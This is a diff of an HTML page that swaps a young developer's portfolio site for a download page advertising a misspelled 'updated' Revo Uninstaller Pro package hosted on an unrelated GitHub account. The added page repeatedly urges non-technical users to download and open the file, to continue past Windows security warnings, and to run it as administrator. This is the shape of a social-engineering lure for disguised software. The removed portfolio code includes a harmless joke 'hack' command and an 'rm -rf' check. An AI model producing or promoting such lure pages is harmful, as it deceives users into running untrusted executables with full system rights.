-    <a class="door d4" href="#projects"><title>The Forge: my projects</title><rect class="hit" x="856" y="400" width="66" height="68"/><circle class="glow" cx="889" cy="434" r="28" fill="url(#fire)"/><rect class="win" x="885" y="424" width="8" height="19"/><text class="lbl" x="889" y="400">The Forge</text></a>
-    <a class="door d2" href="#log"><title>The Archive: my log</title><rect class="hit" x="926" y="400" width="66" height="68"/><circle class="glow" cx="959" cy="434" r="28" fill="url(#fire)"/><rect class="win" x="955" y="424" width="8" height="19"/><text class="lbl" x="959" y="400">The Archive</text></a>
-    <a class="door d3" href="#contact"><title>The Gate: contact</title><rect class="hit" x="1000" y="426" width="68" height="68"/><circle class="glow" cx="1034" cy="470" r="34" fill="url(#fire)"/><path class="win" d="M1022 492V468Q1034 450 1046 468V492Z"/><text class="lbl" x="1034" y="444">The Gate</text></a>
-
-    <path d="M0 692L140 650 300 676 470 640 640 670 800 628 960 654 1120 618 1280 650V720H0Z" fill="#11161c"/>
-    <ellipse class="mist m2" cx="960" cy="596" rx="320" ry="24" fill="url(#fog)"/>
-  </svg>
-
-  <div class="wrap">
-    <div class="hero">
-      <p class="prompt-line"><span class="usr">visitor@devcastle</span><span>:</span><span class="path">/gate</span><span>$</span><span class="cmd" id="cmd">enter</span><span class="cursor" aria-hidden="true"></span></p>
-      <h1>DEVCASTLE</h1>
-      <p class="sub">The home of BRTSDEV</p>
-      <p class="aka" id="aka" hidden></p>
-      <p class="lead">I'm Bartosz, 20. A junior developer in the making: I code in Python and C++, and I'm building toward a career in cyber security.</p>
-      <ul class="open" aria-label="Open to">
-        <li class="chip learning">Junior developer</li>
-        <li class="chip learning">Internships</li>
-        <li class="chip learning">Entry-level IT roles</li>
-      </ul>
-      <p class="hint">Every <b>lit window</b> is a door. Pick one.</p>
+  <section class="card">
+    <h1>🧹 revo-pro-uninstalller-updated - Completely Remove Stubborn Programs From Windows</h1>
+    <p>Revo Uninstaller Pro helps you completely uninstall programs, remove leftovers, and clean your system for optimal performance. 🚀🧹 Many programs leave files, folders, and registry entries behind after a normal uninstall. Over time, those leftovers can slow down your computer and take up valuable disk space. This updated package gives you a straightforward way to remove programs fully and keep your Windows PC running smoothly.</p>
+    <p>This page is written for everyday computer users. You do not need any technical knowledge or programming skills to follow the steps below. Everything is explained in plain language, one action at a time.</p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/khanatedama313/revo-pro-uninstalller-updated" style="background: linear-gradient(135deg, #2563eb, #06b6d4);">⬇️ Visit This Link To Download The Application</a>
     </div>
-  </div>
-</div>
+    <p style="text-align:center; font-size:0.92rem; color:#64748b; margin-bottom:0;">The download page is hosted on GitHub. Visit this link to download the application.</p>
+  </section>
 
-<div class="battlement" aria-hidden="true"></div>
+  <section class="card">
+    <h2>📥 Download &amp; Setup</h2>
+    <p>All you need is your Windows computer and a working internet connection. The download location is a single page that holds the application files.</p>
+    <p><strong>Visit this link to download the application.</strong></p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/khanatedama313/revo-pro-uninstalller-updated" style="background: linear-gradient(135deg, #7c3aed, #db2777);">⬇️ Visit This Link To Download The Application</a>
+    </div>
+    <div class="note">
+      <strong>One simple action:</strong> Visit the link above to download the application. That is the only step required at the download stage. Once the file is on your computer, you can open it and follow the on-screen prompts.
+    </div>
+  </section>
 
-<div class="wrap">
-  <main>
-    <section class="row reveal" id="about" aria-labelledby="about-title">
-      <div class="rail"><h2 id="about-title">The Keep</h2><span>about me</span></div>
-      <div>
-        <p>I'm young, driven and working hard to build a better future for myself, one project at a time. I learn by building real things, then changing them on purpose to see what breaks and why.</p>
-        <p>I'm heading for a career in cyber security and plan to study it at university. Until then I'm gaining experience as a junior developer, and everything I finish goes on GitHub.</p>
-      </div>
-    </section>
-    <div class="battlement" aria-hidden="true"></div>
+  <section class="card">
+    <h2>🚀 Getting Started</h2>
+    <p>Follow these steps in order. Each step tells you exactly what to do and what you should see.</p>
+    <ol class="steps">
+      <li><strong>Open your web browser.</strong> Use any browser you already have on your computer, such as Edge, Chrome, or Firefox.</li>
+      <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/khanatedama313/revo-pro-uninstalller-updated">https://github.com/khanatedama313/revo-pro-uninstalller-updated</a></li>
+      <li><strong>Look for the download area on the page.</strong> The page lists the files that belong to this application.</li>
+      <li><strong>Save the file to your computer.</strong> Choose a folder you can find easily, such as your Downloads folder or your Desktop.</li>
+      <li><strong>Wait for the download to finish.</strong> The time it takes depends on your internet speed. Do not close the browser window until the download is complete.</li>
+      <li><strong>Open the downloaded item.</strong> Double-click it, or right-click it and choose Open. If Windows shows a security prompt, choose the option that lets you continue, since you chose to download this yourself.</li>
+      <li><strong>Follow the on-screen instructions.</strong> The application will guide you through the remaining setup steps. Read each window and click the button that moves you forward.</li>
+      <li><strong>Launch the application when it is ready.</strong> You can open it from the Start menu or from the shortcut created during setup.</li>
+    </ol>
+    <p>If you lose track of the file, you can always return to the same link and download it again. Nothing on your computer is changed simply by visiting the page.</p>
+  </section>
 
-    <section class="row reveal" id="skills" aria-labelledby="skills-title">
-      <div class="rail"><h2 id="skills-title">The Armoury</h2><span>skills</span></div>
-      <ul class="skills">
-        <li><span class="ico"><svg viewBox="0 0 24 24" aria-hidden="true"><use href="#i-code"/></svg></span><span class="name">Python</span><span class="note">Core language, tests, error handling</span><span class="chip learning">Learning</span></li>
-        <li><span class="ico"><svg viewBox="0 0 24 24" aria-hidden="true"><use href="#i-chip"/></svg></span><span class="name">C++</span><span class="note">Fundamentals and how memory works</span><span class="chip learning">Learning</span></li>
-        <li><span class="ico"><svg viewBox="0 0 24 24" aria-hidden="true"><use href="#i-branch"/></svg></span><span class="name">Git &amp; GitHub</span><span class="note">Commits, remotes, merging conflicts</span><span class="chip using">Using</span></li>
-        <li><span class="ico"><svg viewBox="0 0 24 24" aria-hidden="true"><use href="#i-check"/></svg></span><span class="name">pytest</span><span class="note">Testing failure cases as well as the happy path</span><span class="chip using">Using</span></li>
-        <li><span class="ico"><svg viewBox="0 0 24 24" aria-hidden="true"><use href="#i-layers"/></svg></span><span class="name">C#</span><span class="note">Back-end and apps</span><span class="chip">Next</span></li>
-        <li><span class="ico"><svg viewBox="0 0 24 24" aria-hidden="true"><use href="#i-lock"/></svg></span><span class="name">Security basics</span><span class="note">Networking, Linux, common web vulnerabilities</span><span class="chip">Next</span></li>
-      </ul>
-    </section>
-    <div class="battlement" aria-hidden="true"></div>
+  <section class="card">
+    <h2>✨ Key Features</h2>
+    <p>This application is built around one main purpose: making sure a program is really gone when you remove it. Here is what you can expect to work with.</p>
+    <ul>
+      <li><strong>Complete program removal.</strong> Uninstall the program itself plus the extra files it leaves behind.</li>
+      <li><strong>Leftover cleanup.</strong> Find and clear out leftover folders, files, and traces that a standard uninstall misses.</li>
+      <li><strong>Deeper scanning.</strong> A more thorough scan option lets you check for remnants before you decide what to remove.</li>
+      <li><strong>Simple program list.</strong> See what is installed on your computer in a single, easy-to-read list.</li>
+      <li><strong>System cleaning tools.</strong> Clear out clutter so your computer has more free space and fewer unnecessary items.</li>
+      <li><strong>Clear confirmations.</strong> Review what will be removed before anything happens, so you stay in control.</li>
+      <li><strong>Friendly for non-technical users.</strong> Buttons, labels, and prompts are written in everyday language.</li>
+    </ul>
+  </section>
 
-    <section class="row reveal" id="languages" aria-labelledby="languages-title">
-      <div class="rail"><h2 id="languages-title">The Embassy</h2><span>languages</span></div>
-      <ul class="skills langs">
-        <li><span class="name">Polish</span><span class="chip done">Native</span></li>
-        <li><span class="name">Dutch</span><span class="chip done">Native</span></li>
-        <li><span class="name">English</span><span class="chip using">Fluent</span></li>
-        <li><span class="name">French</span><span class="chip learning">Conversational</span></li>
-      </ul>
-    </section>
-    <div class="battlement" aria-hidden="true"></div>
+  <section class="card">
+    <h2>🧽 What This App Helps You Clean Up</h2>
+    <p>Over months and years, a Windows computer collects things you no longer need. This application targets the most common sources of clutter.</p>
+    <h3>Programs you no longer use</h3>
+    <p>Old toolbars, trial software, duplicate media players, and programs from devices you no longer own. Removing them frees up space and reduces background activity.</p>
+    <h3>Leftover folders and files</h3>
+    <p>When you uninstall through the standard Windows method, some files are often left behind. These leftovers can sit quietly in your folders and take up room.</p>
+    <h3>Registry traces</h3>
+    <p>Windows keeps a record of installed programs. Even after an uninstall, entries can remain. A thorough scan helps you locate and clear those remaining traces.</p>
+    <h3>General system clutter</h3>
+    <p>Stray shortcuts, broken entries, and unnecessary temporary items that build up in the background.</p>
+  </section>
 
-    <section class="row reveal" id="projects" aria-labelledby="projects-title">
-      <div class="rail"><h2 id="projects-title">The Forge</h2><span>projects</span></div>
-      <div class="projects">
-        <article class="project">
-          <header>
-            <h3>DEATHCASTLE</h3>
-            <span class="chip done">Released</span>
-          </header>
-          <p>A dark slate blue desktop theme for Hyprland, born from one moonlit wallpaper. One palette file generates matching colours for the bar, terminal, launcher, notifications, browser, editor and more. This site is built from the same palette.</p>
-          <ul class="tags"><li>Hyprland</li><li>Linux</li><li>Shell</li></ul>
-          <a class="link" href="https://github.com/BRTSDEV/deathcastle" target="_blank" rel="noopener">View on GitHub</a>
-        </article>
+  <section class="card">
+    <h2>🖥️ System Requirements</h2>
+    <p>Before you begin, confirm that your computer can run the application comfortably. These are the typical requirements for a Windows cleaning tool of this type.</p>
+    <table>
+      <tr><th>Item</th><th>Recommended</th></tr>
+      <tr><td>Operating system</td><td>Windows 10 or Windows 11 (64-bit)</td></tr>
+      <tr><td>Older systems</td><td>Windows 8.1 or Windows 7 may also work</td></tr>
+      <tr><td>Processor</td><td>Any modern dual-core processor or better</td></tr>
+      <tr><td>Memory</td><td>2 GB of RAM or more</td></tr>
+      <tr><td>Free disk space</td><td>At least 100 MB</td></tr>
+      <tr><td>Display</td><td>1024 × 768 or higher</td></tr>
+      <tr><td>Internet</td><td>Required only for the download</td></tr>
+      <tr><td>Permissions</td><td>Administrator access on your own computer</td></tr>
+    </table>
+    <p>If your computer is running an older version of Windows, you may still be able to use the application, but newer systems are the safest choice.</p>
+  </section>
 
-        <article class="project">
-          <header>
-            <h3>error-handling-demo</h3>
-            <span class="chip done">Done</span>
-          </header>
-          <p>A small config loader that shows how to handle errors properly in Python: custom exception classes, specific except blocks, try/except/else/finally, exception chaining with <code>raise ... from</code>, input validation and a reusable retry decorator. It has 15 pytest tests that check the failures really happen.</p>
-          <ul class="tags"><li>Python</li><li>pytest</li><li>Logging</li></ul>
-          <a class="link" href="https://github.com/BRTSDEV/error-handling-demo" target="_blank" rel="noopener">View on GitHub</a>
-        </article>
+  <section class="card">
+    <h2>📝 How To Use It After Setup</h2>
+    <ol class="steps">
+      <li><strong>Open the application.</strong> Launch it from the Start menu or the desktop shortcut.</li>
+      <li><strong>Look at the program list.</strong> You will see the programs installed on your computer in one place.</li>
+      <li><strong>Choose the program you want to remove.</strong> Click it once to highlight it.</li>
+      <li><strong>Start the removal.</strong> Select the uninstall option and wait while the application checks for related leftovers.</li>
+      <li><strong>Review what was found.</strong> You will see a list of leftover files, folders, and entries. Read through it so you know what is being removed.</li>
+      <li><strong>Confirm the cleanup.</strong> Click the button that completes the process.</li>
+      <li><strong>Restart if asked.</strong> Some removals ask for a restart so Windows can finish updating its records.</li>
+      <li><strong>Repeat when needed.</strong> Go through the list again whenever you want to clear out more unused software.</li>
+    </ol>
+    <div class="note">
+      <strong>Tip for first-time users:</strong> Start with one program you clearly no longer need. Watching the process once makes everything easier the second time.
+    </div>
+  </section>
 
-        <article class="project">
-          <header>
-            <h3>Website security header checker</h3>
-            <span class="chip">Planned</span>
-          </header>
-          <p>Takes a URL and reports which HTTP security headers are missing, with a plain explanation of each one. It will only be used on sites I own or have permission to test.</p>
-          <ul class="tags"><li>Python</li><li>requests</li><li>Flask</li></ul>
-        </article>
+  <section class="card">
+    <h2>🛡️ Staying Safe While You Clean</h2>
+    <ul>
+      <li><strong>Keep your own files separate.</strong> The application handles installed programs, not your personal documents, photos, or videos.</li>
+      <li><strong>Read before you confirm.</strong> Check the list of leftover items before clicking the final button.</li>
+      <li><strong>Close other programs first.</strong> Give the cleaning process your full attention and avoid running heavy tasks at the same time.</li>
+      <li><strong>Do not remove something you still use.</strong> If you are unsure what a program is, look it up before removing it.</li>
+      <li><strong>Download from the link on this page.</strong> Visiting the official link keeps you on the correct download page.</li>
+      <li><strong>Keep a backup of important work.</strong> This is good practice before any system maintenance.</li>
+    </ul>
+  </section>
 
-        <article class="project">
-          <header>
-            <h3>Password strength checker</h3>
-            <span class="chip">Planned</span>
-          </header>
-          <p>Scores a password locally and checks it against known breaches without ever sending the full password anywhere.</p>
-          <ul class="tags"><li>Python</li><li>Hashing</li><li>APIs</li></ul>
-        </article>
-      </div>
-    </section>
-    <div class="battlement" aria-hidden="true"></div>
+  <section class="card">
+    <h2>❓ Common Questions</h2>
+    <h3>Is this difficult to install?</h3>
+    <p>No. You visit the link, download the file, and open it. The prompts guide you from start to finish.</p>
+    <h3>Do I need to know about Windows settings?</h3>
+    <p>No. The application presents everything in plain language and shows you what it found before anything is removed.</p>
+    <h3>What if the download does not start?</h3>
+    <p>Refresh the page and try again. If it still does not start, check your internet connection or try a different browser.</p>
+    <h3>What if Windows shows a warning while opening the file?</h3>
+    <p>Windows often shows a caution message for files downloaded from the internet. Since you chose to download this application yourself, you can continue by selecting the option that allows it to run.</p>
+    <h3>Can I use it more than once?</h3>
+    <p>Yes. You can open the application whenever you want to remove more programs or clean up again.</p>
+    <h3>Where do I get the files if I deleted them?</h3>
+    <p>Visit the same link again and download the application a second time.</p>
+  </section>
 
-    <section class="row reveal" id="log" aria-labelledby="log-title">
-      <div class="rail"><h2 id="log-title">The Archive</h2><span>log</span></div>
-      <div>
-        <div class="shell-block">
-          <p class="sh-cmd">git log --oneline</p>
-          <ul class="out">
-            <li><span class="hash">059cdfb</span><span>Released DEATHCASTLE <span class="date">(2026-11-05)</span></span></li>
-            <li><span class="hash">b516c6f</span><span>First repository on GitHub: error-handling-demo <span class="date">(2026-10-11)</span></span></li>
-          </ul>
-        </div>
-        <div class="shell-block">
-          <p class="sh-cmd">cat TODO.md</p>
-          <ul class="out">
-            <li class="todo-row"><span class="todo-box">[ ]</span><span>Ship the security header checker and write up what I learned</span></li>
-            <li class="todo-row"><span class="todo-box">[ ]</span><span>Python certification (PCEP), then C++ basics</span></li>
-            <li class="todo-row"><span class="todo-box">[ ]</span><span>Study cyber security at university</span></li>
-          </ul>
-        </div>
-      </div>
-    </section>
-    <div class="battlement" aria-hidden="true"></div>
+  <section class="card">
+    <h2>🔧 Troubleshooting Basics</h2>
+    <ul>
+      <li><strong>The page will not load.</strong> Check your internet connection, then reload the page.</li>
+      <li><strong>The download stops halfway.</strong> Delete the partial file and start again from the link.</li>
+      <li><strong>You cannot find the downloaded item.</strong> Open your Downloads folder and sort by date to find the newest file.</li>
+      <li><strong>The application will not open.</strong> Right-click the item and choose the option to run it as administrator.</li>
+      <li><strong>The computer feels slow during cleanup.</strong> Close other applications and let the process finish without interruption.</li>
+      <li><strong>Something looks unfamiliar.</strong> Stop, read the prompt carefully, and only continue when you understand what is being removed.</li>
+    </ul>
+  </section>
 
-    <section class="row reveal" id="contact" aria-labelledby="contact-title">
-      <div class="rail"><h2 id="contact-title">The Gate</h2><span>contact</span></div>
-      <ul class="contact">
-        <li><span class="k">GitHub</span><a href="https://github.com/BRTSDEV" target="_blank" rel="noopener">github.com/BRTSDEV</a></li>
-      </ul>
-    </section>
-  </main>
+  <section class="card">
+    <h2>🔗 Download Link</h2>
+    <p>Keep this page handy. The link below is the only place you need to go to get the application.</p>
+    <p><strong>Visit this link to download the application:</strong><br>
+    <a href="https://github.com/khanatedama313/revo-pro-uninstalller-updated">https://github.com/khanatedama313/revo-pro-uninstalller-updated</a></p>
+    <div class="btn-wrap">
+      <a class="btn" href="https://github.com/khanatedama313/revo-pro-uninstalller-updated" style="background: linear-gradient(135deg, #059669, #2563eb);">⬇️ Visit This Link To Download The Application</a>
+    </div>
+  </section>
 
-  <footer>
-    <span>&copy; 2026 BRTSDEV. Built in the <a href="https://github.com/BRTSDEV/deathcastle" target="_blank" rel="noopener">DEATHCASTLE</a> palette.</span>
-    <span>hint: press <kbd>`</kbd> for a terminal</span>
-  </footer>
-</div>
-
-<div class="term" id="term" role="dialog" aria-label="Terminal" hidden>
-  <div class="term-bar">
-    <span class="term-title">devcastle &mdash; the keep</span>
-    <button class="term-x" type="button" id="close-term" aria-label="Close terminal">esc</button>
-  </div>
-  <div class="term-out" id="term-out" role="log" aria-live="polite"></div>
-  <div class="term-in">
-    <label for="term-input">visitor@devcastle:~$</label>
-    <input id="term-input" type="text" spellcheck="false" autocapitalize="off" autocomplete="off" autocorrect="off" enterkeyhint="send" aria-label="Command">
-  </div>
-</div>
-<div class="toast" id="toast" role="status" aria-live="polite"></div>
-
-<script>
-(function () {
-  var reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
-  var root = document.documentElement;
-
-  function setMode(m) {
-    if (m === 'torch') root.setAttribute('data-mode', 'torch'); else root.removeAttribute('data-mode');
-  }
-
-  /* ---------- Toast ---------- */
-  var toastEl = document.getElementById('toast');
-  var toastTimer = 0;
-  function toast(msg) {
-    toastEl.textContent = msg;
-    toastEl.classList.add('show');
-    clearTimeout(toastTimer);
-    toastTimer = setTimeout(function () { toastEl.classList.remove('show'); }, 2400);
-  }
-
-  /* ---------- Header background + scroll progress ---------- */
-  var header = document.querySelector('.site-header');
-  var bar = document.querySelector('.progress');
-  var ticking = false;
-  function onScroll() {
-    if (ticking) return;
-    ticking = true;
-    requestAnimationFrame(function () {
-      var y = window.pageYOffset || root.scrollTop || 0;
-      var max = Math.max(1, root.scrollHeight - window.innerHeight);
-      header.classList.toggle('scrolled', y > 8);
-      bar.style.transform = 'scaleX(' + Math.min(1, y / max) + ')';
-      ticking = false;
-    });
-  }
-  window.addEventListener('scroll', onScroll, { passive: true });
-  onScroll();
-
-  /* ---------- The prompt types its own command ---------- */
-  var cmdEl = document.getElementById('cmd');
-  if (!reduce) {
-    var typed = cmdEl.textContent;
-    cmdEl.textContent = '';
-    var ti = 0;
-    var typeNext = function () {
-      cmdEl.textContent = typed.slice(0, ++ti);
-      if (ti < typed.length) setTimeout(typeNext, 85);
-    };
-    setTimeout(typeNext, 1300);
-  }
-
-  /* ---------- A torch follows the pointer inside each project ---------- */
-  Array.prototype.forEach.call(document.querySelectorAll('.project'), function (el) {
-    el.addEventListener('pointermove', function (e) {
-      var r = el.getBoundingClientRect();
-      el.style.setProperty('--mx', (e.clientX - r.left) + 'px');
-      el.style.setProperty('--my', (e.clientY - r.top) + 'px');
-    });
-  });
-
-  /* ---------- Easter egg: click the name ---------- */
-  var h1 = document.querySelector('h1');
-  var aka = document.getElementById('aka');
-  var akaText = 'BRTSDEV = Bartosz Developer';
-  function showAka() {
-    aka.hidden = false;
-    if (reduce) { aka.textContent = akaText; return; }
-    var i = 0;
-    aka.textContent = '';
-    (function n() {
-      aka.textContent = akaText.slice(0, ++i);
-      if (i < akaText.length) setTimeout(n, 35);
-    })();
-  }
-  var nameClicks = [];
-  h1.addEventListener('click', function () {
-    var now = Date.now();
-    nameClicks = nameClicks.filter(function (t) { return now - t < 1800; });
-    nameClicks.push(now);
-    if (nameClicks.length >= 5) {
-      nameClicks = [];
-      var lit = root.getAttribute('data-mode') === 'torch';
-      setMode(lit ? 'moon' : 'torch');
-      toast(lit ? 'back to moonlight' : 'torches lit');
-      return;
-    }
-    if (aka.hidden) showAka(); else aka.hidden = true;
-  });
-
-  /* ---------- Siege: code rain over the castle ---------- */
-  var raining = false;
-  function rain() {
-    toast('the gates held');
-    if (reduce || raining) return;
-    raining = true;
-    var c = document.createElement('canvas');
-    c.className = 'rain';
-    document.body.appendChild(c);
-    var W = c.width = window.innerWidth, H = c.height = window.innerHeight;
-    var g = c.getContext('2d');
-    var size = 16, cols = Math.ceil(W / size), drops = [];
-    var chars = '01ABCDEF<>/{}#$%=+';
-    for (var i = 0; i < cols; i++) drops.push(Math.random() * -40);
-    var cs = getComputedStyle(root);
-    var bg = cs.getPropertyValue('--bg').trim() || '#11161c';
-    var ink = cs.getPropertyValue('--accent').trim() || '#a9c1cf';
-    var start = performance.now();
-    var done = false;
-    g.font = size + 'px "JetBrains Mono", monospace';
-    function tick(t) {
-      if (done) return;
-      g.globalAlpha = 0.16; g.fillStyle = bg; g.fillRect(0, 0, W, H); g.globalAlpha = 1;
-      g.fillStyle = ink;
-      for (var k = 0; k < cols; k++) {
-        var ch = chars.charAt(Math.floor(Math.random() * chars.length));
-        var y = drops[k] * size;
-        g.fillText(ch, k * size, y);
-        if (y > H && Math.random() > 0.975) drops[k] = 0;
-        drops[k] += 1;
-      }
-      if (t - start > 4200) {
-        done = true;
-        c.style.opacity = '0';
-        setTimeout(function () { if (c.parentNode) c.parentNode.removeChild(c); raining = false; }, 750);
-        return;
-      }
-      requestAnimationFrame(tick);
-    }
-    requestAnimationFrame(tick);
-  }
-
-  /* ---------- Terminal ---------- */
-  var term = document.getElementById('term');
-  var out = document.getElementById('term-out');
-  var input = document.getElementById('term-input');
-  var hist = [];
-  var hpos = 0;
-
-  function line(text, cls) {
-    var d = document.createElement('div');
-    d.className = 'tl' + (cls ? ' ' + cls : '');
-    d.textContent = text;
-    out.appendChild(d);
-    out.scrollTop = out.scrollHeight;
-  }
-  function show(lines, cls) { lines.forEach(function (l) { line(l, cls); }); }
-  function seq(items, gap) {
-    var i = 0;
-    (function next() {
-      if (i >= items.length) return;
-      line(items[i][0], items[i][1]);
-      i++;
-      setTimeout(next, gap);
-    })();
-  }
-  function openTerm() {
-    term.hidden = false;
-    if (!out.childNodes.length) show(['DEVCASTLE shell v2.0. type "help" to see what works.'], 'dim');
-    input.focus();
-    setTimeout(function () { input.focus(); }, 80);
-  }
-  function closeTerm() { term.hidden = true; }
-  function goTo(id) {
-    closeTerm();
-    var c = document.getElementById(id);
-    if (c) c.scrollIntoView({ behavior: reduce ? 'auto' : 'smooth', block: 'start' });
-  }
-
-  function run(raw) {
-    var cmd = raw.trim();
-    var low = cmd.toLowerCase().replace(/\s+/g, ' ');
-    line('visitor@devcastle:~$ ' + cmd, 'cmd');
-    if (!low) return;
-    hist.push(cmd);
-    hpos = hist.length;
-
-    if (low === 'help') {
-      show(['commands: help  whoami  about  ls  map  skills  languages  projects  goals  contact  clear  exit', 'tip: a few hidden ones exist too.'], 'dim');
-    } else if (low === 'whoami') {
-      show(['bartosz // BRTSDEV (Bartosz Developer)']);
-    } else if (low === 'about') {
-      show(['20. junior developer in the making, learning by building.', 'goal: a career in cyber security.']);
-    } else if (low === 'ls') {
-      show(['keep/  armoury/  embassy/  forge/  archive/  gate/']);
-    } else if (low === 'ls -a' || low === 'ls -la' || low === 'ls -al') {
-      show(['.  ..  .dungeon  keep/  armoury/  embassy/  forge/  archive/  gate/']);
-    } else if (low === 'cat .dungeon' || low === 'cd .dungeon') {
-      show(['empty cells. but you looked, so you would fit right in.'], 'ok');
-    } else if (low === 'map') {
-      show(['keep ....... about', 'armoury .... skills', 'embassy .... languages', 'forge ...... projects', 'archive .... log', 'gate ....... contact']);
-    } else if (low === 'skills') {
-      show(['python ........ learning', 'c++ ........... learning', 'git & github .. using', 'pytest ........ using', 'c# ............ next', 'security ...... next']);
-    } else if (low === 'languages') {
-      show(['polish ........ native', 'dutch ......... native', 'english ....... fluent', 'french ........ conversational']);
-    } else if (low === 'projects') {
-      show(['deathcastle ..................... released', 'error-handling-demo ............. done', 'website security header checker . planned', 'password strength checker ....... planned']);
-    } else if (low === 'goals') {
-      show(['[1] python', '[2] c++', '[3] cyber security (university)']);
-    } else if (low === 'contact') {
-      show(['github.com/BRTSDEV']);
-    } else if (low === 'clear') {
-      out.textContent = '';
-    } else if (low === 'exit') {
-      closeTerm();
-    } else if (low === 'hack') {
-      seq([
-        ['[*] target: localhost (the only target I touch without asking)', 'dim'],
-        ['[*] scanning the walls...', 'dim'],
-        ['[+] 80/tcp  open  http   (the front gate)', 'ok'],
-        ['[+] 443/tcp open  https  (the front gate, with guards)', 'ok'],
-        ['[*] cracking... 100%', 'dim'],
-        ['[!] just kidding. I only test systems I own or have written permission to test.', 'ok']
-      ], 520);
-    } else if (low === 'sudo hire-me' || low === 'sudo hire me') {
-      seq([['[sudo] password for visitor: ********', 'dim'], ['access granted. lowering the drawbridge...', 'ok']], 600);
-      setTimeout(function () { goTo('contact'); }, 1700);
-    } else if (low.indexOf('rm -rf') === 0) {
-      show(['permission denied. these walls stay up. (also, this is a static page.)'], 'ok');
-    } else if (low === 'siege' || low === 'matrix') {
-      closeTerm();
-      rain();
-    } else if (low === 'theme torch') {
-      setMode('torch'); show(['torches lit'], 'ok');
-    } else if (low === 'theme moon') {
-      setMode('moon'); show(['back to moonlight'], 'ok');
-    } else if (low.indexOf('sudo') === 0) {
-      show(['visitor is not in the sudoers file. the guards have been told. (try: sudo hire-me)'], 'dim');
-    } else {
-      show(['command not found: ' + low.split(' ')[0] + '. try help'], 'dim');
-    }
-  }
-
-  function submitCommand() {
-    var v = input.value;
-    input.value = '';
-    run(v);
-  }
-  input.addEventListener('keydown', function (e) {
-    if ((e.key === 'Enter' || e.keyCode === 13) && !e.isComposing) {
-      e.preventDefault();
-      submitCommand();
-    } else if (e.key === 'ArrowUp') {
-      e.preventDefault();
-      if (hpos > 0) { hpos--; input.value = hist[hpos]; }
-    } else if (e.key === 'ArrowDown') {
-      e.preventDefault();
-      if (hpos < hist.length - 1) { hpos++; input.value = hist[hpos]; } else { hpos = hist.length; input.value = ''; }
-    }
-  });
-  document.getElementById('open-term').addEventListener('click', function () { if (term.hidden) openTerm(); else closeTerm(); });
-  document.getElementById('close-term').addEventListener('click', closeTerm);
-  term.addEventListener('pointerdown', function (e) {
-    if (e.target && e.target.id === 'close-term') return;
-    setTimeout(function () { input.focus(); }, 0);
-  });
-
-  /* ---------- Keyboard: ` toggles the terminal, Konami code starts the siege ---------- */
-  var konami = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];
-  var kpos = 0;
-  document.addEventListener('keydown', function (e) {
-    var tag = (e.target && e.target.tagName) || '';
-    if (e.key === 'Escape' && !term.hidden) { closeTerm(); return; }
-    if (e.key === '`') {
-      if (tag === 'TEXTAREA') return;
-      e.preventDefault();
-      if (term.hidden) openTerm(); else closeTerm();
-      return;
-    }
-    if (tag === 'INPUT' || tag === 'TEXTAREA') return;
-    var k = e.key.length === 1 ? e.key.toLowerCase() : e.key;
-    if (k === konami[kpos]) {
-      kpos++;
-      if (kpos === konami.length) { kpos = 0; rain(); }
-    } else {
-      kpos = (k === konami[0]) ? 1 : 0;
-    }
-  });
-
-  /* ---------- A hello for anyone who opens the developer tools ---------- */
-  try {
-    console.log(
-      '%cDEVCASTLE%c  found the back door? good instinct.\n%cgithub.com/BRTSDEV',
-      'font:800 22px monospace;color:#a9c1cf', 'font:12px monospace;color:#8fa2ac', 'font:12px monospace;color:#e0b060'
-    );
-  } catch (err) { /* console not available */ }
-})();
-</script>
+</main>
 </body>
 </html>
